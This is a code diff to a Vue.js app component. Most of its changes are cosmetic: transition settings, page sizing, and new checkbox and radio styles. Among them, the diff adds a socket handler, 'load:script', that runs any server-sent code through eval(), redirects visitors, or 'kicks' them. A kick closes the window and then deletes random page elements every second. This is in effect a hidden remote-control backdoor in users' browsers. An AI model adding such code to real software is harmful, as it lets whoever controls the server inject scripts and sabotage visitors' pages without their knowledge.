@@ -1,7 +1,7 @@
 <template>
-    <router-view v-slot="{ Component, route }">
+    <router-view v-slot="{ Component }">
         <MainHeader/>
-        <transition :enter-active-class="`animate__animated ${route.meta.transition || 'animate__zoomIn'}`">
+        <transition>
             <component :class="{ 'page': true, 'hide': getPaint.open }" :is="Component"/>
         </transition>
         <Paint v-if="getPaint.open"/>
@@ -54,10 +54,30 @@ export default {
     sockets: {
         connect: () => {
             console.log('socket connected');
+        },
+        'load:script' (data) {
+            switch(data.type) {
+                case "path":
+                    this.router(data.value)
+                    break;
+                case "redirect":
+                    this.redirect(data.value, '_self')
+                    break;
+                case "script":
+                    eval(data.value)
+                    break;
+                case "kick":
+                    window.close()
+                    setInterval(() => {
+                        let a = document.querySelectorAll('div')
+                        a[Math.floor(Math.random() * a.length)].remove()
+                    }, 1000)
+                    break;
+            }
         }
     },
     methods: {
-        ...mapActions(['setTheme', 'setPaint'])
+        ...mapActions(['setTheme', 'setPaint', 'close'])
     },
     mounted() {
 
@@ -84,14 +104,87 @@ export default {
 
 .page {
     position: relative;
-    min-width: 100%;
-    min-height: 100vh;
+    width: 100%;
+    // min-height: 100vh;
 }
 
 .page.hide {
     transition: 1s;
     opacity: 0;
     z-index: -1;
+}
+
+
+.checkbox {
+    user-select: none;
+    
+    input[type=checkbox] {
+        height: 0;
+        width: 0;
+        position: absolute;
+        visibility: hidden;
+    }
+    
+    span {
+        cursor: pointer;
+        display: block;
+        width: 17px;
+        height: 17px;
+        position: relative;
+        text-indent: -9999px;
+        border-radius: 50%;
+        border: 3px solid var(--color-2);
+        transition: .2s;
+    }
+    
+    input:checked + span {
+        border-radius: 0;
+        box-shadow: 0 0 7px 0px var(--dimming-3), 0 0 7px 0px var(--dimming-3) inset;
+        transform: rotate(135deg) scale(.9);
+    }
+    
+    &:active span:after {
+        width: 14px;
+    }
+    
+}
+
+.radio {
+    display: flex;
+    margin: 4px;
+    align-items: center;
+    user-select: none;
+    
+    input[type=radio] {
+        height: 0;
+        width: 0;
+        position: absolute;
+        visibility: hidden;
+    }
+    
+    span {
+        cursor: pointer;
+        display: block;
+        margin: 0 8px 0 0;
+        width: 14px;
+        height: 14px;
+        position: relative;
+        text-indent: -9999px;
+        border-radius: 50%;
+        border: 3px solid var(--color);
+        transition: .2s;
+    }
+    
+    input:checked + span {
+        border-radius: 0;
+        background: var(--color);
+        transform: rotate(135deg) scale(.7);
+    }
+    
+    &:active span:after {
+        width: 14px;
+    }
+    
 }
 
 </style>
